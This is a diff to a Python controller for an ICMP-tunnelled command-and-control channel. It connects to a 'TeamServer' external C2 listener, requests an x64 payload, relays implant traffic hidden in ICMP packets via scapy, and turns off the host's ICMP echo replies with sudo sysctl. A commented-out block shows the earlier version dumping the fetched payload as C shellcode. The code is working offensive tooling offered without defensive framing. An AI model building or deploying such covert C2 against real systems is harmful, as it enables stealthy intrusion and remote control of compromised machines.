@@ -1,9 +1,9 @@
 import socket
 import struct
 from scapy.all import sniff, send, IP, ICMP, Raw
-import math
-import uuid
+import sys
 import time
+import subprocess
 # === Constants ===
 ICMP_TAG = "RQ47"
 PAYLOAD_MAX_SIZE = 512 * 1024
@@ -20,14 +20,25 @@ class ICMP_C2_Handler:
 
     def socket_setup(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(10) # 5 sec timeout
         try:
             self.sock.connect((self.server_ip, self.server_port))
             print(f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}")
+        except socket.timeout:
+            print(f"[!] Socket timed out - is listener up at {self.server_ip}:{self.server_port}?")
+            self.sock.close()
+            exit()
         except Exception as e:
             print(f"[-] Connection failed: {e}")
             self.sock.close()
             self.sock = None
+            exit()
 
+
+    def get_payload(self):
+        '''
+        Needs to be called right after connecting
+        '''
         # apparently need to do setup right after connecting
         self.send_frame(b"arch=x64")
         self.send_frame(b"pipename=foobar")
@@ -178,37 +189,66 @@ class ICMP_C2_Handler:
             seq += 1
             time.sleep(.1)
     def go(self):
-        print("[+] Attempting to connect to TeamServer External C2 Listener")
+        print(f"[+] Attempting to connect to TeamServer External C2 Listener at: {self.server_ip}:{self.server_port}")
         self.socket_setup()
         if not self.sock:
             return
 
-        print("[+] Starting ICMP sniffer...")
+        print("[+] Getting payload from TeamServer")
+        self.get_payload()
+
+        print("[+] Starting ICMP Listener...")
         sniff(filter="icmp", prn=self.handle_icmp, store=0)
 
 
+def disable_echo_response():
+    print("=" * 50 )
+    try:
+        print("[+] Disabling ICMP echo replies from the system. This script will handle them instead")
+
+        result = subprocess.run(
+            ['sudo', 'sysctl', '-w', 'net.ipv4.icmp_echo_ignore_all=1'],
+            check=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        print("Output:", result.stdout)
+    except subprocess.CalledProcessError as e:
+        print("Could not disable ICMP Echo replies - ICMP listener may not receive all messages:", e.stderr)
+
+    print("=" * 50 )
+
 if __name__ == "__main__":
-    c2 = ICMP_C2_Handler(ip="10.10.10.21", port=2222)
+    if len(sys.argv) < 3:
+        print("[!] Required arguments: Host, Port. Ex: `python3 controller.py 127.0.0.1 2222`")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+
+    disable_echo_response()
+    c2 = ICMP_C2_Handler(ip=host, port=port)
     c2.go()
     #print(c2.payload)
 
-    raw = c2.payload  # bytes object
+    # raw = c2.payload  # bytes object
 
-    # Build a comma-separated 0xNN list, 16 bytes per line for readability
-    lines = []
-    for i in range(0, len(raw), 16):
-        chunk = raw[i:i+16]
-        hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
-        lines.append("    " + hex_bytes)
+    # # Build a comma-separated 0xNN list, 16 bytes per line for readability
+    # lines = []
+    # for i in range(0, len(raw), 16):
+    #     chunk = raw[i:i+16]
+    #     hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
+    #     lines.append("    " + hex_bytes)
 
-    array_body = ",\n".join(lines)
+    # array_body = ",\n".join(lines)
 
-    shellcode_c  = "unsigned char shellcode[] = {\n"
-    shellcode_c += array_body
-    shellcode_c += "\n};\n"
-    shellcode_c += f"unsigned int shellcode_len = {len(raw)};\n"
+    # shellcode_c  = "unsigned char shellcode[] = {\n"
+    # shellcode_c += array_body
+    # shellcode_c += "\n};\n"
+    # shellcode_c += f"unsigned int shellcode_len = {len(raw)};\n"
 
-    with open("payload_shellcode.h", "w") as f:
-        f.write(shellcode_c)
+    # with open("payload_shellcode.h", "w") as f:
+    #     f.write(shellcode_c)
 
-    print(f"[+] Wrote payload_shellcode.h ({len(raw)} bytes of shellcode)") 
+    # print(f"[+] Wrote payload_shellcode.h ({len(raw)} bytes of shellcode)") 
